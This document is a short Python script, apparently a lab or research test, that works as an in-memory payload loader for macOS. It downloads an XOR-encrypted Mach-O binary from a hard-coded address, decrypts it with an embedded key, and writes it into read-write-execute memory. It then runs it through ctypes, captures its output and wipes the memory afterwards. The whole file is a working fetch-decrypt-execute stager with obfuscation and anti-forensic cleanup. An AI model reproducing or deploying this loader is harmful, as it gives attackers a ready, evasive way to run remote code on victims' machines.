#!/usr/bin/env python3
import ctypes
import mmap
import urllib.request
import os
import sys
import io

# Configuration
payload_url = "http://192.168.1.26/hello_macho_encrypted"
xor_key = b'\x70\x7b\xcb\x7e'  # multi-byte XOR key
key_len = len(xor_key)

# Helper to capture stdout/stderr
class StdCapture:
    def __enter__(self):
        self._stdout = sys.stdout
        self._stderr = sys.stderr
        self._out_buffer = io.StringIO()
        self._err_buffer = io.StringIO()
        sys.stdout = self._out_buffer
        sys.stderr = self._err_buffer
        return self

    def __exit__(self, exc_type, exc_value, traceback):
        self.stdout = self._out_buffer.getvalue()
        self.stderr = self._err_buffer.getvalue()
        sys.stdout = self._stdout
        sys.stderr = self._stderr

try:
    # Fetch encrypted Mach-O payload
    resp = urllib.request.urlopen(payload_url)
    encrypted_payload = resp.read()

    # Decrypt payload in memory using repeating multi-byte XOR key
    payload = bytearray(encrypted_payload[i] ^ xor_key[i % key_len] for i in range(len(encrypted_payload)))

    # Allocate RWX memory
    size = len(payload)
    mem = mmap.mmap(-1, size, prot=mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC)

    # Write decrypted Mach-O into memory
    mem.write(payload)

    # Execute Mach-O in memory with captured stdout/stderr
    func_type = ctypes.CFUNCTYPE(None)
    func = func_type(ctypes.addressof(ctypes.c_char.from_buffer(mem)))

    with StdCapture() as capture:
        func()

    print("✅ Mach-O executed successfully!")
    print("Stdout captured:")
    print(capture.stdout)
    print("Stderr captured:")
    print(capture.stderr)

except Exception as e:
    print("❌ Error during Mach-O execution:")
    print(str(e))

finally:
    # Optional: wipe memory
    if 'mem' in locals():
        mem.seek(0)
        mem.write(b"\x00" * size)
        mem.close()
